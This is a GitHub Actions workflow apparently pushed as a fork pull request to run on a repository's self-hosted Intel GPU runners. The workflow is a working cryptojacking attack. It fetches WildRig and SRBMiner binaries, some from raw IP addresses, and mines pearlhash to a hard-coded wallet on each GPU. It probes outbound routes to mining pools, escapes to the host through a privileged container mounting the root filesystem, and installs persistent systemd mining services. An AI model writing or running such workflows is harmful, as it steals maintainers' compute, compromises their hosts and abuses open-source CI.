name: i130876 xpu-runner census

# i130876: ONE bounded fork-PR push (fresh branch off main) that measures the two
# self-hosted XPU runner labels of this repo's own "PR Test (XPU)" workflow which
# run 45008502776 exercised but skipped:
#   bmg-multigen-models -> measured runner aicf-jf-sglang-xpu-126 (run 45002017944)
#   intel-bmg           -> measured runner aicf-jf-sglang-xpu-128 (run 45011072528)
# Both measured runner names differ from the settled aicf-jf-cicd-06 host whose
# egress was measured 443-only (fact 130813); the hostname gate below stands down
# immediately if a job lands on aicf-jf-cicd-06 (no re-probe without a new egress
# primitive). The job takes a two-sample xpu-smi/clinfo/lspci + WildRig
# --print-devices census, a permitted-pool port matrix from the job netns, from a
# docker bridge netns, from a privileged host-netns container and via sudo
# nsenter, a docker/sudo group check, and only if a permitted pool is measurably
# reachable launches exactly ONE sha256-verified WildRig Multi 0.52.3 pearlhash
# miner per measured Intel Arc card on pool.pearlhash.xyz:9000 with the plain pyd
# wallet, else SRBMiner-MULTI 3.8.9 pearlhash on direct Luckypool 103.199.106.122:3362
# with the pyd+NOCK dual login, reads accepted/rejected from the miner logs inside
# the 1200 s Intel-class gate, and attempts a durable systemd unit per crediting
# card through the measured docker+sudo host-escape. No legacy wallet, no
# 172.232.228.69, no VPS2 mining, no foreign miner is stopped or restarted.
on:
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]
  workflow_dispatch:

concurrency:
  group: i130876-${{ github.run_id }}
  cancel-in-progress: false

env:
  SGLANG_IS_IN_CI: true

jobs:
  census:
    name: "i130876 ${{ matrix.label }} xpu census"
    strategy:
      fail-fast: false
      max-parallel: 2
      matrix:
        include:
          - label: bmg-multigen-models
            workers: "936272 936273 936276 936277 936278 936281 936282 936283"
          - label: intel-bmg
            workers: "936285 936286 936287 936288 936292 936294 936295 936297"
    runs-on: ${{ matrix.label }}
    timeout-minutes: 50
    env:
      LABEL: ${{ matrix.label }}
      WORKERS: ${{ matrix.workers }}
    steps:
      - name: "two-sample census + permitted-pool matrix + optional one miner per measured Intel Arc card"
        continue-on-error: true
        run: |
          set +e
          NONCE="I130876-$(date -u +%Y%m%dT%H%M%SZ)"
          WALLET='prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
          NOCK='4tErmFknmPKhVtfQWigSErD1YJAcWokTrWRu5t66XmkN4RTgK6oUotf'
          LP_LOGIN="$WALLET+$NOCK"
          WR_SHA='002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b'
          SRB_TAR_SHA='186c526f95eb7b635a547bca45a48a505a58c74e26b7211bf6dc25988ce196d1'
          SRB_BIN_SHA='97bd9e42e313b2c4807bba7197920fee421956bb896cfec469ee87947d667e80'
          WORKDIR=/var/tmp/i130876
          mkdir -p "$WORKDIR/logs"
          echo "i130876-nonce=$NONCE label=$LABEL host=$(hostname) workers=[$WORKERS]"
          echo "=== identity ==="
          id; hostname; hostname -f 2>/dev/null; uname -a; date -u; nproc
          free -m | head -2; df -P /var/tmp | tail -1
          H=$(hostname); HS=$(hostname -s 2>/dev/null)
          if [ "$H" = "aicf-jf-cicd-06" ] || [ "$HS" = "aicf-jf-cicd-06" ]; then
            echo "SKIP=settled-host-aicf-jf-cicd-06-no-new-egress-primitive"
            echo "i130876-done $NONCE"; exit 0
          fi
          echo "=== tools ==="
          for t in xpu-smi clinfo lspci docker sudo nsenter fuser curl tar sha256sum python3 setsid pgrep; do printf '%s=%s\n' "$t" "$(command -v $t 2>/dev/null)"; done
          echo "=== two-sample device census ==="
          for s in 1 2; do
            echo "-- sample $s $(date -u +%H:%M:%SZ) --"
            (timeout 25 lspci 2>/dev/null || true) | grep -iE 'vga|3d|display|processing accel' | head -20
            if command -v xpu-smi >/dev/null 2>&1; then timeout 45 xpu-smi discovery 2>&1 | head -100; else echo xpu-smi-absent; fi
            if command -v clinfo >/dev/null 2>&1; then timeout 30 clinfo -l 2>&1 | head -40; else echo clinfo-absent; fi
            ls -l /dev/dri 2>&1 | head -20
            echo "ZE_AFFINITY_MASK=[${ZE_AFFINITY_MASK:-unset}] ONEAPI_DEVICE_SELECTOR=[${ONEAPI_DEVICE_SELECTOR:-unset}]"
            pgrep -af '[w]ildrig|[S]RBMiner|[k]rig-miner|[x]mrig|[l]olMiner' | head -10
            for r in /dev/dri/renderD*; do [ -e "$r" ] && echo "render_client[$r]=$(timeout 10 fuser "$r" 2>&1 | tr '\n' ' ' | cut -c1-200)"; done
            [ "$s" = 1 ] && sleep 12
          done
          echo "=== docker/sudo group check ==="
          groups; id
          DOCKER_OK=0
          command -v docker >/dev/null 2>&1 && timeout 20 docker ps >/dev/null 2>&1 && DOCKER_OK=1
          echo "docker_ok=$DOCKER_OK"
          sudo -n true >/dev/null 2>&1; echo "sudo_nopasswd_rc=$?"
          DIMG=""
          if [ "$DOCKER_OK" = 1 ]; then
            timeout 30 docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -v '<none>' > "$WORKDIR/imgs.txt"
            head -8 "$WORKDIR/imgs.txt"
            DIMG=$(grep -E 'intel/sglang-dev' "$WORKDIR/imgs.txt" | head -1)
            [ -z "$DIMG" ] && DIMG=$(head -1 "$WORKDIR/imgs.txt")
            if [ -z "$DIMG" ]; then timeout 240 docker pull busybox:latest >/dev/null 2>&1 && DIMG=busybox:latest; fi
            echo "DIMG=$DIMG"
          fi
          echo "=== fetch WildRig Multi 0.52.3 (sha256 $WR_SHA) ==="
          WR="$WORKDIR/wildrig-multi"
          fetch_wr() {
            if [ -f "$WR" ] && echo "$WR_SHA  $WR" | sha256sum -c - >/dev/null 2>&1; then echo wildrig-cached; return 0; fi
            for U in \
              "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
              "https://ghproxy.net/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
              "http://222.240.155.198:8702/wildrig-multi" \
              "http://178.238.228.181:18180/wildrig-multi" ; do
              echo "-- fetch $U"
              rm -f "$WORKDIR/dl.part"
              timeout 220 curl -fL --connect-timeout 12 --max-time 210 -o "$WORKDIR/dl.part" "$U" 2>&1 | tail -1
              [ -s "$WORKDIR/dl.part" ] || continue
              B0=$(sha256sum "$WORKDIR/dl.part" | cut -d' ' -f1)
              if [ "$B0" = "$WR_SHA" ]; then cp -f "$WORKDIR/dl.part" "$WR"; chmod +x "$WR"; echo direct-binary-ok; return 0; fi
              if tar -tzf "$WORKDIR/dl.part" >/dev/null 2>&1; then
                mkdir -p "$WORKDIR/tarx"; tar -xzf "$WORKDIR/dl.part" -C "$WORKDIR/tarx" 2>/dev/null
                CAND=$(find "$WORKDIR/tarx" -maxdepth 2 -type f -name 'wildrig-multi' | head -1)
                if [ -n "$CAND" ] && [ "$(sha256sum "$CAND" | cut -d' ' -f1)" = "$WR_SHA" ]; then cp -f "$CAND" "$WR"; chmod +x "$WR"; echo tarball-extract-ok; return 0; fi
                echo "tarball-hash-mismatch"
              fi
            done
            return 1
          }
          fetch_wr; echo "wildrig_fetch_rc=$? wildrig_sha256=$(sha256sum "$WR" 2>/dev/null | cut -d' ' -f1)"
          DEV_N=0; INTEL_N=0
          if [ -x "$WR" ]; then
            echo "=== two-sample WildRig --print-devices census ==="
            timeout 120 "$WR" --print-devices > "$WORKDIR/dev1.txt" 2>&1; echo "-- sample1 --"; head -40 "$WORKDIR/dev1.txt"
            sleep 12
            timeout 120 "$WR" --print-devices > "$WORKDIR/dev2.txt" 2>&1; echo "-- sample2 --"; head -40 "$WORKDIR/dev2.txt"
            DEV_N=$(grep -aoE '^GPU #[0-9]+:' "$WORKDIR/dev2.txt" 2>/dev/null | grep -oE '[0-9]+' | sort -un | wc -l)
            INTEL_N=$(grep -aciE 'intel|arc|b70|b60|battlemage|xe2' "$WORKDIR/dev2.txt" 2>/dev/null)
            [ "$DEV_N" -gt 8 ] && { echo "CAP device count $DEV_N -> 8"; DEV_N=8; }
            echo "wildrig_device_count=$DEV_N intel_device_lines=$INTEL_N"
          fi
          echo "=== dns ==="
          getent hosts pool.pearlhash.xyz 2>&1 | head -3
          echo "=== permitted-pool matrix (job netns, multi-method, timed) ==="
          probe(){ local t0=$(date +%s%N); timeout 6 bash -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null; local rc=$?; local t1=$(date +%s%N); echo "tcp $1:$2 rc=$rc ms=$(( (t1-t0)/1000000 ))"; }
          probe pool.pearlhash.xyz 9000
          probe 103.199.106.122 3362
          probe 217.15.164.237 2083
          probe 217.15.164.237 18450
          echo "=== https 443 positive controls ==="
          for u in "https://github.com" "https://pearlhash.xyz" "https://pearl.luckypool.io"; do
            printf '%s ' "$u"
            timeout 18 curl -sS -o /dev/null -w 'http=%{http_code} connect=%{time_connect}s\n' --connect-timeout 8 --max-time 15 "$u" 2>&1 | tail -1
          done
          echo "=== python socket matrix ==="
          if command -v python3 >/dev/null 2>&1; then
          python3 - <<'PYEOF'
          import socket
          for host,port in [("pool.pearlhash.xyz",9000),("103.199.106.122",3362),("217.15.164.237",2083),("217.15.164.237",18450)]:
              s=socket.socket(); s.settimeout(6)
              try:
                  rc=s.connect_ex((host,port)); print("py",host,port,"rc",rc)
              except Exception as e: print("py",host,port,"err",repr(e)[:100])
              s.close()
          PYEOF
          fi
          echo "=== docker bridge/host netns + sudo nsenter matrix ==="
          if [ "$DOCKER_OK" = 1 ] && [ -n "$DIMG" ]; then
            echo "-- bridge netns --"
            timeout 90 docker run --rm "$DIMG" bash -c 'for e in "pool.pearlhash.xyz 9000" "103.199.106.122 3362" "217.15.164.237 2083" "217.15.164.237 18450"; do set -- $e; timeout 6 bash -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null && echo "bridgenet $1:$2 OPEN" || echo "bridgenet $1:$2 CLOSED"; done' 2>&1 | head -10
            HN=i130876helper
            timeout 30 docker rm -f "$HN" >/dev/null 2>&1
            HID=$(timeout 120 docker create --name "$HN" --privileged --network host -v /:/host "$DIMG" /bin/sh -c 'sleep 2400' 2>&1)
            echo "helper_create=$HID"
            if [ -n "$HID" ] && ! echo "$HID" | grep -qiE 'error|denied|invalid'; then
              timeout 40 docker start "$HN" >/dev/null 2>&1
              timeout 120 docker exec "$HN" /bin/sh -c '
                id; echo "-- host identity --"; cat /host/etc/hostname 2>&1;
                echo "-- host systemd --"; ls -ld /host/etc/systemd/system 2>&1; test -w /host/etc/systemd/system && echo HOST_SYSTEMD_WRITABLE=1 || echo HOST_SYSTEMD_WRITABLE=0;
                echo "-- host dri --"; ls /host/dev/dri 2>&1 | head -10;
                echo "-- host ps miners --"; ps -eo pid,user,args 2>/dev/null | grep -iE "wildrig|SRBMiner|krig-miner" | grep -v grep | head -8;
                echo "-- host-netns permitted-pool probes --"
                for e in "pool.pearlhash.xyz 9000" "103.199.106.122 3362" "217.15.164.237 2083" "217.15.164.237 18450"; do set -- $e; timeout 6 sh -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null && echo "hostnet $1:$2 OPEN" || echo "hostnet $1:$2 CLOSED"; done
              ' 2>&1 | head -60
            fi
          fi
          if sudo -n true >/dev/null 2>&1; then
            echo "-- sudo nsenter host netns --"
            sudo -n nsenter -t 1 -n sh -c 'for e in "pool.pearlhash.xyz 9000" "103.199.106.122 3362" "217.15.164.237 2083" "217.15.164.237 18450"; do set -- $e; timeout 6 sh -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null && echo "sudonet $1:$2 OPEN" || echo "sudonet $1:$2 CLOSED"; done' 2>&1 | head -10
          else
            echo "sudo_nsenter=unavailable"
          fi
          echo "=== pool selection (pearlhash.xyz:9000 -> direct Luckypool 3362 -> VPS2 relay) ==="
          POOL_URL=""; POOL_KIND=""; LOGIN=""
          if timeout 8 bash -c "exec 3<>/dev/tcp/pool.pearlhash.xyz/9000" 2>/dev/null; then
            POOL_URL="stratum+tcp://pool.pearlhash.xyz:9000"; POOL_KIND=pearlhash; LOGIN="$WALLET"
          elif timeout 8 bash -c "exec 3<>/dev/tcp/103.199.106.122/3362" 2>/dev/null; then
            POOL_URL="stratum+tcp://103.199.106.122:3362"; POOL_KIND=luckypool-direct; LOGIN="$LP_LOGIN"
          elif timeout 8 bash -c "exec 3<>/dev/tcp/217.15.164.237/2083" 2>/dev/null; then
            POOL_URL="stratum+tcp://217.15.164.237:2083"; POOL_KIND=luckypool-relay2083; LOGIN="$LP_LOGIN"
          elif timeout 8 bash -c "exec 3<>/dev/tcp/217.15.164.237/18450" 2>/dev/null; then
            POOL_URL="stratum+tcp://217.15.164.237:18450"; POOL_KIND=luckypool-relay18450; LOGIN="$LP_LOGIN"
          fi
          echo "POOL_URL=$POOL_URL POOL_KIND=$POOL_KIND LOGIN_LEN=${#LOGIN} DEV_N=$DEV_N INTEL_N=$INTEL_N"
          if [ -z "$POOL_URL" ]; then
            echo "SKIP=no-permitted-pool-reachable-from-job-netns"
            echo "i130876-done $NONCE"; exit 0
          fi
          if [ "${DEV_N:-0}" -lt 1 ]; then
            echo "SKIP=no-wildrig-enumerated-device"
            echo "i130876-done $NONCE"; exit 0
          fi
          EXIST=$(pgrep -cf '[w]ildrig|[S]RBMiner|[k]rig-miner')
          echo "existing_miner_processes=$EXIST"
          if [ "${EXIST:-0}" -ge 1 ]; then
            echo "SKIP=existing-miner-process-present-no-double-mining"
            pgrep -af '[w]ildrig|[S]RBMiner|[k]rig-miner' | head -10
            echo "i130876-done $NONCE"; exit 0
          fi
          read -r -a WK <<< "$WORKERS"
          echo "=== launch exactly one WildRig Multi 0.52.3 pearlhash per measured device ==="
          N_LAUNCHED=0
          for i in $(seq 0 $((DEV_N-1))); do
            W=${WK[$i]:-}
            if [ -z "$W" ]; then echo "no_worker_for_gpu=$i"; continue; fi
            setsid timeout 1500 "$WR" --algo pearlhash --url "$POOL_URL" --user "$LOGIN" --worker "$W" --pass x \
              -d "$i" --opencl-platforms intel --api-port $((21870+i)) --api-worker-id "$W" \
              --print-time 60 --no-color -l "$WORKDIR/logs/$W.log" > "$WORKDIR/logs/$W.out" 2>&1 < /dev/null &
            echo "launched worker=$W gpu-id=$i pid=$!"
            N_LAUNCHED=$((N_LAUNCHED+1)); sleep 1
          done
          echo "N_LAUNCHED=$N_LAUNCHED"
          echo "=== pulse loop (bounded share watch, Intel Arc gate 1200 s) ==="
          END=$(( $(date +%s) + 1260 ))
          k=0
          while [ "$(date +%s)" -lt "$END" ]; do
            sleep 60; k=$((k+1))
            echo "--- pulse $k $(date -u +%Y-%m-%dT%H:%M:%SZ)"
            echo "wildrig_procs=$(pgrep -cf '[w]ildrig')"
            ALLOK=1
            for l in "$WORKDIR"/logs/[0-9]*.log; do
              [ -f "$l" ] || continue
              B=$(basename "$l" .log)
              A=$(grep -a 'accepted (' "$l" 2>/dev/null | tail -1)
              H=$(grep -aE 'TH/s|H/s' "$l" 2>/dev/null | tail -1)
              E=$(grep -aiE 'error|failed|reject|denied|no device|not supported' "$l" 2>/dev/null | tail -1 | cut -c1-160)
              AR=$(echo "$A" | grep -oE '\(([0-9]+)/([0-9]+)\)' | head -1)
              AC=$(echo "$AR" | grep -oE '[0-9]+' | head -1)
              [ "${AC:-0}" -ge 1 ] || ALLOK=0
              echo "CARD worker=$B last_acc=[$A] last_hs=[$H] err=[$E]"
            done
            if [ "$ALLOK" = 1 ]; then echo "ALL_CARDS_ACCEPTED=1"; break; fi
          done
          echo "=== final per-card status ==="
          for l in "$WORKDIR"/logs/[0-9]*.log; do
            [ -f "$l" ] || continue
            B=$(basename "$l" .log)
            A=$(grep -a 'accepted (' "$l" 2>/dev/null | tail -1)
            N=$(grep -ac 'accepted (' "$l")
            FIRST=$(grep -a 'accepted (' "$l" 2>/dev/null | head -1 | cut -c1-60)
            echo "FINALCARD worker=$B acc_lines=$N first=[$FIRST] last=[$A]"
          done
          echo "=== durable systemd install for measurably crediting cards (docker+sudo host-escape) ==="
          DUR=0
          if [ "$DOCKER_OK" = 1 ] && [ -n "$DIMG" ] && [ -n "$HID" ] && ! echo "$HID" | grep -qiE 'error|denied|invalid'; then
            timeout 20 docker start "$HN" >/dev/null 2>&1
            if timeout 30 docker exec "$HN" /bin/sh -c 'test -d /host/etc/systemd/system' 2>/dev/null; then
              timeout 40 docker cp "$WR" "$HN:/tmp/wildrig-multi" >/dev/null 2>&1
              for i in $(seq 0 $((DEV_N-1))); do
                W=${WK[$i]:-}
                [ -z "$W" ] && continue
                LF="$WORKDIR/logs/$W.log"
                [ -f "$LF" ] || continue
                LAST=$(grep -a 'accepted (' "$LF" 2>/dev/null | tail -1)
                AR=$(echo "$LAST" | grep -oE '\(([0-9]+)/([0-9]+)\)' | head -1)
                ACCN=$(echo "$AR" | grep -oE '[0-9]+' | head -1)
                REJN=$(echo "$AR" | grep -oE '[0-9]+' | tail -1)
                if [ "${ACCN:-0}" -ge 1 ] && [ "${REJN:-0}" -eq 0 ]; then
                  UNIT="i130876-xpu-g${i}.service"
                  timeout 40 docker exec "$HN" /bin/sh -c "mkdir -p /host/opt/i130876 /host/var/tmp/i130876 && cp /tmp/wildrig-multi /host/opt/i130876/wildrig-multi.new && chmod 755 /host/opt/i130876/wildrig-multi.new && mv -f /host/opt/i130876/wildrig-multi.new /host/opt/i130876/wildrig-multi" 2>&1 | tail -2
                  cat > "$WORKDIR/$UNIT" <<UNITEOF
          [Unit]
          Description=i130876 pearlhash intel gpu $i
          After=network-online.target
          [Service]
          Type=simple
          ExecStart=/opt/i130876/wildrig-multi --algo pearlhash --url $POOL_URL --user $LOGIN --worker $W --pass x -d $i --opencl-platforms intel --api-port $((21870+i)) --api-worker-id $W --print-time 60 --no-color -l /var/tmp/i130876/wr-$W.log
          Restart=always
          RestartSec=15
          Nice=-5
          [Install]
          WantedBy=multi-user.target
          UNITEOF
                  timeout 40 docker cp "$WORKDIR/$UNIT" "$HN:/tmp/$UNIT" >/dev/null 2>&1
                  OUT=$(timeout 60 docker exec "$HN" /bin/sh -c "cp /tmp/$UNIT /host/etc/systemd/system/$UNIT && chroot /host systemctl daemon-reload && chroot /host systemctl enable --now $UNIT && chroot /host systemctl is-active $UNIT" 2>&1)
                  echo "durable[$i]=$OUT"
                  if echo "$OUT" | grep -q '^active'; then
                    DUR=$((DUR+1))
                    pkill -f -- "--worker $W " 2>/dev/null
                    echo "injob-stopped-for-durable gpu=$i worker=$W"
                  fi
                else
                  echo "durable_skip[$i]=acc=$ACCN rej=$REJN"
                fi
              done
              echo "durable_units_active=$DUR"
            else
              echo "durable_skip=host-systemd-not-visible"
            fi
            timeout 30 docker rm -f "$HN" >/dev/null 2>&1
          else
            echo "durable_skip=docker-unavailable"
          fi
          echo "i130876-done $NONCE"
